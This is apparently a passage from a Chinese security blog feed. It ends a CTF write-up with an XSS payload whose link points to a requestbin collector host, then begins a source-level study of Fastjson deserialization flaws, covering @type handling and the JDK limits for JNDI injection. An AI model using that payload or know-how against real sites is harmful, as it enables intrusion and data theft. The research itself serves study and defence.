<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1c7z4dg1&gt;xss&lt;/audio&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111543.png" alt="image-20200525110253009"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化漏洞研究</title>
    <url>/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<blockquote>
<p>研究Fastjson各版本系列反序列化漏洞</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>源码：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</blockquote>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>推荐在maven中配置，在pom.xml中添加 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法</p>
<p>当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用</p>
<p>在1.2.25之后的版本中，fastjson默认关闭了反序列化任意类的操作，即<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">AutoType</a>，对应的是json字符串中<code>&quot;@type&quot;</code>对应的值</p>
<p>JNDI注入可以利用RMI或者LDAP服务，高版本的jdk会限制这两个服务的开启，它们可利用的jdk版本如下：</p>
<ul>
<li>基于RMI的利用方式，适用jdk版本：<code>6u132</code>、<code>7u122</code>、 <code>8u113</code>之前</li>
<li>基于LDAP的利用方式，适用jdk版本：<code>6u211</code>、<code>7u201</code>、<code>8u191</code>、<code>11.0.1</code>之前</li>
</ul>
<h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p><strong>序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> JSON.toJSONString(obj); </span><br></pre></td></tr></table></figure>

<p><strong>反序列化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parse()会识别并调用目标类的setter方法及某些特定条件的getter方法</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(<span class="string">&quot;&#123;json_str&#125;&quot;</span>); <span class="comment">// 返回JSONObject或JSONArray</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// parseObject() 等价于 parseObject() =&gt; JSON.toJSON(obj)</span></span><br><span class="line"><span class="comment">// parseObject()会调用反序列化目标类的所有setter和getter方法</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;json_str&#125;&quot;</span>); <span class="comment">// 只能返回JSONObject</span></span><br><span class="line"><span class="type">TestClass</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;json_str&#125;&quot;</span>, TestClass.class); <span class="comment">// 返回TestClass类对象</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化流程图"><a href="#反序列化流程图" class="headerlink" title="反序列化流程图"></a>反序列化流程图</h3><p>核心在于语法解析器</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105232211af82d694dfca10657691.png" alt="image-20210523011132183" style="zoom:80%;" />

<h3 id="反序列化调用流程"><a href="#反序列化调用流程" class="headerlink" title="反序列化调用流程"></a>反序列化调用流程</h3><p>这里我把<code>parse()</code>函数作为例子，探究一下json字符串从反序列化开始后到对应属性的<code>set</code>方法的函数调用过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">JSON</span> <span class="keyword">implements</span> <span class="title class_">JSONStreamAware</span>, JSONAware &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE); <span class="comment">// 首先使用默认的feature进行反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(text, ParserConfig.getGlobalInstance(), features); <span class="comment">// 获取默认配置后调用DefaultJSONParser()获取一个DefaultJSONParser</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">            parser.handleResovleTask(value);</span><br><span class="line">            parser.close();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>ParserConfig.getGlobalInstance()</code>返回的是配置的全局变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ParserConfig <span class="title function_">getGlobalInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> global; <span class="comment">// 配置的全局变量</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>紧接着调用<code>DefaultJSONParser()</code>函数返回一个Lexer，就是一个语法解析器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(String input, ParserConfig config, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(input, <span class="keyword">new</span> <span class="title class_">JSONScanner</span>(input, features), config); <span class="comment">// 初始化一个JSONLexer</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(Object input, JSONLexer lexer, ParserConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;</span><br><span class="line">        <span class="built_in">this</span>.contextArrayIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.resolveStatus = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.extraTypeProviders = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.extraProcessors = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.fieldTypeResolver = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.lexer = lexer;</span><br><span class="line">        <span class="built_in">this</span>.input = input;</span><br><span class="line">        <span class="built_in">this</span>.config = config;</span><br><span class="line">        <span class="built_in">this</span>.symbolTable = config.symbolTable;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent(); <span class="comment">// 使用JSONLexer标记字符串中的&#x27;&#123;&#x27;和&#x27;[&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();</span><br><span class="line">            ((JSONLexerBase)lexer).token = <span class="number">12</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();</span><br><span class="line">            ((JSONLexerBase)lexer).token = <span class="number">14</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>JSONScanner()</code>函数是用来获取BOM信息的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JSONScanner</span> <span class="keyword">extends</span> <span class="title class_">JSONLexerBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JSONScanner</span><span class="params">(String input, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(features);</span><br><span class="line">        <span class="built_in">this</span>.text = input;</span><br><span class="line">        <span class="built_in">this</span>.len = <span class="built_in">this</span>.text.length();</span><br><span class="line">        <span class="built_in">this</span>.bp = -<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.next(); <span class="comment">// 读字符串的BOM</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;\ufeff&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>获取完Lexer之后我们就进入到<code>parser.parse()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parse((Object)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">(Object fieldName)</span> &#123;</span><br><span class="line">        <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="built_in">this</span>.lexer;</span><br><span class="line">        <span class="keyword">switch</span>(lexer.token()) &#123; <span class="comment">// 根据token</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error, &quot;</span> + lexer.info());</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="type">Number</span> <span class="variable">intValue</span> <span class="operator">=</span> lexer.integerValue();</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> intValue;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="type">String</span> <span class="variable">stringLiteral</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">            lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123;</span><br><span class="line">                <span class="type">JSONScanner</span> <span class="variable">iso8601Lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONScanner</span>(stringLiteral);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (iso8601Lexer.scanISO8601DateIfMatch()) &#123;</span><br><span class="line">                        <span class="type">Date</span> <span class="variable">var11</span> <span class="operator">=</span> iso8601Lexer.getCalendar().getTime();</span><br><span class="line">                        <span class="keyword">return</span> var11;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    iso8601Lexer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stringLiteral;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> Boolean.TRUE;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> Boolean.FALSE;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            lexer.nextToken(<span class="number">18</span>);</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() != <span class="number">18</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            lexer.nextToken(<span class="number">10</span>);</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">10</span>);</span><br><span class="line">            <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> lexer.integerValue().longValue();</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">this</span>.accept(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(time);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>: <span class="comment">// 识别到JsonObject</span></span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.parseObject((Map)object, fieldName);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>: <span class="comment">// 识别到JsonArray</span></span><br><span class="line">            <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)array, (Object)fieldName);</span><br><span class="line">            <span class="keyword">if</span> (lexer.isEnabled(Feature.UseObjectArray)) &#123;</span><br><span class="line">                <span class="keyword">return</span> array.toArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">if</span> (lexer.isBlankInput()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;unterminated json string, &quot;</span> + lexer.info());</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            HashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)set, (Object)fieldName);</span><br><span class="line">            <span class="keyword">return</span> set;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            TreeSet&lt;Object&gt; treeSet = <span class="keyword">new</span> <span class="title class_">TreeSet</span>();</span><br><span class="line">            <span class="built_in">this</span>.parseArray((Collection)treeSet, (Object)fieldName);</span><br><span class="line">            <span class="keyword">return</span> treeSet;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>JSONObject()</code>函数设置map</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObject</span> <span class="keyword">extends</span> <span class="title class_">JSON</span> <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, Object&gt;, Cloneable, Serializable, InvocationHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JSONObject</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">boolean</span> ordered)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ordered) &#123; <span class="comment">// 根据ordered特征选择HashMap</span></span><br><span class="line">            <span class="built_in">this</span>.map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>(initialCapacity);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.map = <span class="keyword">new</span> <span class="title class_">HashMap</span>(initialCapacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步到调用最核心的<code>this.parseObject()</code>函数，整个函数都是在用Lexer提取出字符串中的键值和对应值，因为这个函数比较长，所以就不具体展示了，我们重点看判断<code>@type</code>字段的代码</p>
<blockquote>
<p>这里简单提一下lexer的相关操作，因为代码太长就不详细列出了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>); <span class="comment">// 用来提取双引号包括的内容</span></span><br><span class="line">lexer.nextToken(<span class="number">16</span>); <span class="comment">// 转移到expect为16的case分支，根据当前的字符设置新的token，如果没有找到就会调用this.nextToken();</span></span><br><span class="line">lexer.nextToken(); <span class="comment">// 根据当前的字符设置token</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(Map object, Object fieldName)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; <span class="comment">// JSON.DEFAULT_TYPE_KEY的值为@type</span></span><br><span class="line">            ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>); <span class="comment">// 获取@type对应的类名</span></span><br><span class="line">            Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="built_in">this</span>.config.getDefaultClassLoader()); <span class="comment">// 使用loadCLass()加载对应类</span></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">                    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        instance = <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                            instance = ((JavaBeanDeserializer)deserializer).createInstance(<span class="built_in">this</span>, clazz);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                                instance = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(ref)) &#123;</span><br><span class="line">                                instance = Collections.emptyMap();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                instance = clazz.newInstance();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        obj = instance;</span><br><span class="line">                        <span class="keyword">return</span> obj;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;create instance error&quot;</span>, var23);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.setResolveStatus(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.context != <span class="literal">null</span> &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.popContext();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (object.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    instance = TypeUtils.cast(object, clazz, <span class="built_in">this</span>.config);</span><br><span class="line">                    <span class="built_in">this</span>.parseObject(instance);</span><br><span class="line">                    thisObj = instance;</span><br><span class="line">                    <span class="keyword">return</span> thisObj;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz); <span class="comment">// 获取反序列化解析器</span></span><br><span class="line">                thisObj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName); <span class="comment">// 进行反序列化</span></span><br><span class="line">                <span class="keyword">return</span> thisObj;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            object.put(JSON.DEFAULT_TYPE_KEY, ref);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟进<code>TypeUtils.loadClass()</code>函数，创建ClassLoader返回了对应类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className); <span class="comment">// 获取类名</span></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123; <span class="comment">// 去掉&#x27;[&#x27;</span></span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123; <span class="comment">// 去掉前面的&#x27;L&#x27;和后面&#x27;;&#x27;</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123; <span class="comment">// 检查是否已有指定的classLoader</span></span><br><span class="line">                        clazz = classLoader.loadClass(className);</span><br><span class="line">                        mappings.put(className, clazz);</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                    var6.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader(); <span class="comment">// 从当前线程创建classLoader</span></span><br><span class="line">                    <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                        mappings.put(className, clazz);</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clazz = Class.forName(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步进入到<code>getDeserializer()</code>函数，获取对应的反序列化器，这里返回的是<code>JavaBeanDeserializer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Type type)</span> &#123;</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">derializer</span> <span class="operator">=</span> (ObjectDeserializer)<span class="built_in">this</span>.derializers.get(type);</span><br><span class="line">        <span class="keyword">if</span> (derializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> derializer;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">            <span class="type">Type</span> <span class="variable">rawType</span> <span class="operator">=</span> ((ParameterizedType)type).getRawType();</span><br><span class="line">            <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="built_in">this</span>.getDeserializer((Class)rawType, type) : <span class="built_in">this</span>.getDeserializer(rawType);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">        